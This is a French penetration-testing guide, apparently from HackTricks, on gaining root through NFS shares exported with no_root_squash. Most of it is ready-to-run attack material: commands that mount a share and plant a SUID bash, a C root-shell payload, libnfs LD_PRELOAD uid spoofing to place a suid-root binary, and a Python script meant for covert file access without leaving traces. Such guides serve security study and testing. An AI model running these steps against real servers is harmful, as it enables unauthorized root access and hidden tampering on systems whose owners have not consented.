# Escalade de privilèges due à une mauvaise configuration NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informations de base sur le Squashing

NFS fait généralement confiance au `uid` et au `gid` indiqués par le client qui se connecte pour accéder aux fichiers (si Kerberos n'est pas utilisé). Cependant, certaines configurations peuvent être définies sur le serveur pour **modifier ce comportement** :

- **`all_squash`** : Il applique le squash à tous les accès en mappant chaque utilisateur et groupe vers **`nobody`** (65534 unsigned / -2 signed). Ainsi, tout le monde est `nobody` et aucun utilisateur n'est utilisé.
- **`root_squash`/`no_all_squash`** : Il s'agit de la configuration par défaut sous Linux et elle applique le squash **uniquement aux accès avec l'uid 0 (root)**. Par conséquent, tous les `UID` et `GID` sont considérés comme fiables, mais `0` est mappé vers `nobody` (aucune usurpation de root n'est donc possible).
- **``no_root_squash`** : Si cette configuration est activée, elle n'applique même pas le squash à l'utilisateur root. Cela signifie que si vous montez un répertoire avec cette configuration, vous pouvez y accéder en tant que root.

Dans le fichier **/etc/exports**, si vous trouvez un répertoire configuré avec **no_root_squash**, vous pouvez y **accéder** depuis **un client** et **écrire à l'intérieur** de ce répertoire **comme** si vous étiez le **root** local de la machine.

Pour plus d'informations sur **NFS**, consultez :

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalade de privilèges

### Remote Exploit

Option 1 avec bash :
- **Monter ce répertoire** sur une machine cliente, puis **copier en tant que root** à l'intérieur du dossier monté le binaire **/bin/bash**, lui attribuer les droits **SUID**, puis **exécuter depuis la machine victime** ce binaire bash.
- Notez que pour être root à l'intérieur du partage NFS, **`no_root_squash`** doit être configuré sur le serveur.
- Cependant, si cette option n'est pas activée, vous pouvez effectuer une escalade vers un autre utilisateur en copiant le binaire sur le partage NFS et en lui attribuant la permission SUID correspondant à l'utilisateur vers lequel vous souhaitez effectuer l'escalade.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 avec du code compilé en C :
- **Monter ce répertoire** sur une machine cliente, puis, **en tant que root, copier** dans le dossier monté notre payload compilé qui abusera de la permission SUID, lui attribuer les droits **SUID**, puis **exécuter depuis la machine victime** ce binaire (vous trouverez ici quelques[ payloads C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Mêmes restrictions qu'avant
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit local

> [!TIP]
> Notez que si vous pouvez créer un **tunnel de votre machine vers la machine victime, vous pouvez toujours utiliser la version Remote pour exploiter cette élévation de privilèges en tunneling les ports requis**.\
> L'astuce suivante s'applique si le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez en aucun cas utiliser** l'**exploit Remote** et devrez **abuser de cette astuce**.\
> Une autre condition requise pour que l'exploit fonctionne est que **l'export dans `/etc/export`** **utilise le flag `insecure`**.\
> --_Je ne suis pas certain que cette astuce fonctionne si `/etc/export` indique une adresse IP_--

### Informations de base

Le scénario implique l'exploitation d'un partage NFS monté sur une machine locale, en tirant parti d'une faille dans la spécification NFSv3 qui permet au client de spécifier son uid/gid, ce qui peut permettre un accès non autorisé. L'exploitation consiste à utiliser [libnfs](https://github.com/sahlberg/libnfs), une bibliothèque qui permet de forger des appels RPC NFS.<sup>[[1]](#references)</sup>

#### Compilation de la bibliothèque

Les étapes de compilation de la bibliothèque peuvent nécessiter des ajustements en fonction de la version du kernel. Dans ce cas précis, les syscalls fallocate ont été commentés. Le processus de compilation implique les commandes suivantes :
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exécution de l'exploit

L'exploit consiste à créer un programme C simple (`pwn.c`) qui élève les privilèges jusqu'à root, puis exécute un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier l'uid dans les appels RPC :

1. **Compiler le code de l'exploit :**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Placez l’exploit sur le partage et modifiez ses permissions en falsifiant l’uid :**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Exécuter l’exploit pour obtenir les privilèges root :**
```bash
/mnt/share/a.out
#root
```
### Bonus : accès discret aux fichiers avec NFShell

Une fois l’accès root obtenu, pour interagir avec le partage NFS sans modifier le propriétaire (afin d’éviter de laisser des traces), un script Python (`nfsh.py`) est utilisé. Ce script ajuste l’uid pour correspondre à celui du fichier auquel on accède, permettant ainsi d’interagir avec les fichiers du partage sans problèmes de permissions :<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécuter comme :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Références

- [1] [L'histoire d'une privesc NFS moins connue](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
